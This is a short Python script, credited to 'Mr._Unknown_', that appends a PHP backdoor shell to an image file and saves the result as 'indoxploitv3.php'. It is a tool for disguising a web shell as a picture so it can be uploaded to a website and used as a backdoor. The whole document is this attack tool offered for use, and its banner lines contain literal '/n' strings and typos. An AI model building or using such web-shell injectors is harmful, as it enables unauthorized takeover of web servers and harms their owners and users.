print "Created By Mr._Unknown_"/n
print "Copyright 11 Desember ©2018"/n
print "Using phyton Injectgambar picture.jpg shellbackdoor.php"/n
print "Thanks For Using ^o^"/n
from sys import argv
script, img, shell = argv
i = open(img,'rb').read()
i += open(shell,'rb').read()
f = open('indoxploitv3.php','wb').write(i)
